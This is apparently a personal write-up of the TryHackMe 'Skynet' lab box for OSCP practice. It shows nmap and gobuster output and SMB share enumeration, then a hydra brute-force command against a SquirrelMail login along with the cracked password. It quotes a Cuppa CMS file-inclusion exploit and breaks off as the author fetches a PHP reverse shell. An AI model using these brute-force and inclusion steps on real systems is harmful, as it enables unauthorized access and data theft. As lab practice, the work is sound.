kali@kali:~/oscptraining/tryhackme$ nmap -sV -sC -o nmap 10.10.85.80
Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-24 22:16 EDT
Nmap scan report for 10.10.85.80
Host is up (0.33s latency).
Not shown: 994 closed ports
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 99:23:31:bb:b1:e9:43:b7:56:94:4c:b9:e8:21:46:c5 (RSA)
|   256 57:c0:75:02:71:2d:19:31:83:db:e4:fe:67:96:68:cf (ECDSA)
|_  256 46:fa:4e:fc:10:a5:4f:57:57:d0:6d:54:f6:c3:4d:fe (ED25519)
80/tcp  open  http        Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Skynet
110/tcp open  pop3        Dovecot pop3d
|_pop3-capabilities: AUTH-RESP-CODE TOP PIPELINING SASL UIDL CAPA RESP-CODES
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
143/tcp open  imap        Dovecot imapd
|_imap-capabilities: ID LOGINDISABLEDA0001 SASL-IR more post-login have capabilities listed OK Pre-login LITERAL+ IDLE ENABLE LOGIN-REFERRALS IMAP4rev1
445/tcp open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
Service Info: Host: SKYNET; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 1h40m00s, deviation: 2h53m13s, median: 0s
|_nbstat: NetBIOS name: SKYNET, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: skynet
|   NetBIOS computer name: SKYNET\x00
|   Domain name: \x00
|   FQDN: skynet
|_  System time: 2020-10-24T21:17:36-05:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required   

current possible directory with gobuster
/admin (Status: 301)
/config (Status: 301)
/css (Status: 301)
/index.html (Status: 200)
/index.html (Status: 200)
/js (Status: 301)
/squirrelmail (Status: 301)

seems like we are really going down the rabbit hole, let's go back to what we have seen from the nmap result.
we could see that imap and pop3 ports are open.

taking some reference from google
IMAP and POP3 are the two most commonly used Internet mail protocols for retrieving emails. Both protocols are supported by all modern email clients and web servers. While the POP3 protocol assumes that your email is being accessed only from one application, IMAP allows simultaneous access by multiple clients.

some really good guide on smb enum
https://0xdf.gitlab.io/2018/12/02 pwk-notes-smb-enumeration-checklist-update1.html


kali@kali:~/oscptraining/tryhackme/Skynet$ smbmap -H 10.10.85.80
[+] Guest session       IP: 10.10.85.80:445     Name: 10.10.85.80                                       
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        print$                                                  NO ACCESS       Printer Drivers
        anonymous                                               READ ONLY       Skynet Anonymous Share
        milesdyson                                              NO ACCESS       Miles Dyson Personal Share
        IPC$                                                    NO ACCESS       IPC Service (skynet server (Samba, Ubuntu))

There's a share called "anonymous" that has read access. Lets try connecting to investigate.

kali@kali:~/oscptraining/tryhackme/Skynet$ smbclient //10.10.85.80/anonymous -u anonymous  
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Wed Sep 18 00:41:20 2019
  ..                                  D        0  Tue Sep 17 03:20:17 2019
  attention.txt                       N      163  Tue Sep 17 23:04:59 2019
  logs                                D        0  Wed Sep 18 00:42:16 2019
  books                               D        0  Wed Sep 18 00:40:06 2019

                9204224 blocks of size 1024. 5370044 blocks available

sidetracked for quite a while as i found full of machine learning related books in the books dir, got them copied out to my host XD haha

the attention.txt file
A recent system malfunction has caused various passwords to be changed. All skynet employees are required to change their password after seeing this.
-Miles Dyson

going into logs
log1 seems like a list of possible usernames

let's try to use hydra for logging in, got a great help from this page
https://redteamtutorials.com/2018/10/25/hydra-brute-force-https/

basically just do the following
Change the <Login page> this value has to start with “/” backspace.
Change <Request body> with the format from the page. We do need to modify the username and password. Replace the failed username with ^USER^ and the failed password with ^PASS^. This change will allow hydra to substitute the values.
Change the <Error Message> with the failed login error message.
Change the <IP Address> with either an IP address or hostname.
Change the <User> with either username or username list.
Change the <Password> with either a password or password list.

Layout of command: hydra -L <USER> -P <Password> <IP Address> http-post-form “<Login Page>:<Request Body>:<Error Message>”

hydra -l milesdyson -P log1.txt 10.10.213.235 http-post-form "/squirrelmail/src/redirect.php:login_username=^USER^&secretkey=^PASS^&js_autodetect_results=1&just_logged_in=1:Unknown user or password incorrect."

now we get the credentials as 
login: milesdyson   password: cyborg007haloterminator

kali@kali:~/oscptraining/tryhackme/Skynet$ smbclient //10.10.213.235/milesdyson -U milesdyson
Enter WORKGROUP\milesdyson's password: 
Try "help" to get a list of possible commands.
smb: \> pwd
Current directory is \\10.10.213.235\milesdyson\


side tracking to download shit for fun 
smb: \> mask ""
smb: \> recurse ON
smb: \> prompt OFF
smb: \> mget notes
getting file \notes\3.01 Search.md of size 65601 as 3.01 Search.md (17.9 KiloBytes/sec) (average 867.4 KiloBytes/sec)
getting file \notes\4.01 Agent-Based Models.md of size 5683 as 4.01 Agent-Based Models.md (4.2 KiloBytes/sec) (average 846.1 KiloBytes/sec)
getting file \notes\2.08 In Practice.md of size 7949 as 2.08 In Practice.md (5.7 KiloBytes/sec) (average 825.2 KiloBytes/sec)
getting file \notes\0.00 Cover.md of size 3114 as 0.00 Cover.md (2.1 KiloBytes/sec) (average 803.9 KiloBytes/sec)

(base) mycomp:kali teolw$ scp kali@IP:/home/kali/oscptraining/tryhackme/Skynet/morefreenotes.zip /Users/teolw/Documents/kali
kali@IP's password: 
morefreenotes.zip                             100%  370KB  64.3MB/s   00:00    


kali@kali:~/oscptraining/tryhackme/Skynet$ cat important.txt
1. Add features to beta CMS /45kra24zxs28v3yd
2. Work on T-800 Model 101 blueprints
3. Spend more time with my wife

seems like there's a special directory /45kra24zxs28v3yd, lets do a gobuster on it
kali@kali:~/oscptraining/tryhackme/Skynet$ gobuster dir -u 10.10.240.119/45kra24zxs28v3yd  -x php,txt,cgi,css,py,html -w /usr/share/dirb/wordlists/common.txt

/administrator
we could see that it is running on cuppa cms, so let's try searching if there's any exploit

# Exploit Title   : Cuppa CMS File Inclusion
# Date            : 4 June 2013
# Exploit Author  : CWH Underground
# Site            : www.2600.in.th
# Vendor Homepage : http://www.cuppacms.com/
# Software Link   : http://jaist.dl.sourceforge.net/project/cuppacms/cuppa_cms.zip
# Version         : Beta
# Tested on       : Window and Linux

  ,--^----------,--------,-----,-------^--,
  | |||||||||   `--------'     |          O .. CWH Underground Hacking Team ..
  `+---------------------------^----------|
    `\_,-------, _________________________|
      / XXXXXX /`|     /
     / XXXXXX /  `\   /
    / XXXXXX /\______(
   / XXXXXX /          
  / XXXXXX /
 (________(            
  `------'

####################################
VULNERABILITY: PHP CODE INJECTION
####################################

/alerts/alertConfigField.php (LINE: 22)

-----------------------------------------------------------------------------
LINE 22: 
        <?php include($_REQUEST["urlConfig"]); ?>
-----------------------------------------------------------------------------
    
seems like we must do a php code injection, so let's use php reverse shell
lets get this
kali@kali:~/oscptraining/tryhackme/Skynet$ wget https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php













